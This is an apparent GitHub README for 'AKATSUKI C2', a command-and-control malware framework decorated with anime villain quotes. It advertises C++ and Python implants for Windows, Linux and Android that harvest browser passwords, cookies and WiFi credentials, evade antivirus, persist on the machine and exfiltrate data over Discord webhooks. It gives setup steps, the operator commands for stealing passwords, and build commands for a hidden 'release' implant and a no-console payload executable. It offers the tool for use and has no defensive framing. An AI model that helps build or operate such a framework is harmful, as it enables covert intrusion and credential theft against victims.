<!-- ============================================================
     AKATSUKI C2 — OFFICIAL REPOSITORY
     "We act in the shadows, to rule the light."
     ============================================================ -->

# ◈ **AKATSUKI C2** ◈

> "The world will know pain." — **Pain (Nagato)**

![GitHub license](https://img.shields.io/badge/license-MIT-8B0000)
![C++](https://img.shields.io/badge/C++-17-8B0000?logo=c%2B%2B)
![Python](https://img.shields.io/badge/Python-3.10+-8B0000?logo=python)
![Status](https://img.shields.io/badge/Status-Active-8B0000)

### ☁ Overview
**AKATSUKI C2** is an elite, multi-layered Command & Control framework designed for absolute stealth and surgical precision. By bridging the gap between high-level Python flexibility and low-level C++ native implants, Akatsuki allows for deep-system infiltration across Windows, Linux, and Android (Termux/APK) environments.

### ☁ Features
☁ **Native Windows Implant:** Written in pure C++, utilizing direct WinAPI for minimal footprint and maximum control.
☁ **Cross-Platform Payloads:** Python-based agents tailored for PC and Android (Termux:API support).
☁ **Discord Intelligence:** Secure exfiltration and real-time reporting via Discord Webhooks.
☁ **Arsenal Module:** Automated browser data harvesting (Passwords/Cookies), WiFi recovery, and AV evasion.
☁ **Rich TUI:** A stunning, interactive terminal interface for the C2 server with live tracking and multi-client orchestration.
☁ **Self-Preservation:** Advanced persistence mechanisms and self-update capabilities via C2.

### ☁ Tech Stack
| Component | Stack | Role |
| :--- | :--- | :--- |
| 🏰 **C2 Server** | 🐍 `Python` | Orchestration & TUI |
| 🛡️ **Native Core** | ⚙️ `C++17` | Stealth & Hardened Payload |
| 📡 **Networking** | 🌐 `Flask` | Secure REST API Bridge |
| 📦 **Storage** | 🗄️ `SQLite3` | Local Target Intelligence |
| 👁️ **Logging** | 💬 `Discord` | Tactical Reporting |

### ☁ Installation

1. **Clone the shadows:**
   ```bash
   git clone https://github.com/YOUR_USERNAME/Fsociety.git
   cd Fsociety
   # "Justice comes from the vengeful." — Itachi Uchiha
   ```

2. **Prepare the server environment:**
   ```bash
   pip install -r requirements.txt
   # "Power is not will, it is the phenomenon of physically making things happen." — Madara Uchiha
   ```

### ☁ Usage

1. **Start the C2 Server:**
   ```bash
   python Python/c2.py
   # "Those who do not understand true pain can never understand true peace." — Pain
   ```

2. **Select your target:**
   Use the `select <ID>` command in the TUI to focus on a connected client.

3. **Deploy the Arsenal:**
   Use the `steal passwords` or `ss` commands to gather intelligence instantly.

### ☁ Building the Artifacts

### ◈ C++ Native Implant (.exe)
Requires **MinGW-w64** (g++).
```powershell
cd CPP
# For Testing (Console Visible)
.\build.bat
# For Production (Hidden / Stealth)
.\build.bat release
# "Even the most ignorant, innocent child will eventually grow up as they learn what true pain is." — Pain
```

### ◈ Python Payload to Binary (.exe)
```powershell
pip install pyinstaller
pyinstaller --onefile --noconsole --icon=NONE Python/payloads-pc.py
# "Art is an Explosion!" — Deidara
```

### ◈ Android / Mobile Support
For **Termux**, simply run the script with `python`. For **APK** conversion, use **Buildozer** with Kivy.
```bash
# In Termux
pkg install termux-api
python payloads-ph.py
# "Life is only a moment. It's a collection of many moments." — Kisame Hoshigaki
```

### ☁ Contributing
Membership in Akatsuki is not for the weak. Submit a Pull Request only if your code is perfected and your logic is sound. We do not tolerate inefficiency or clutter. ◈

### ☁ License
MIT License. **"The cycle of hatred will never end, but this project will remain eternal."** — *Uchiha Obito* (Tobi)

---
◈ *FSOCIETY - AKATSUKI DIVISION* ◈
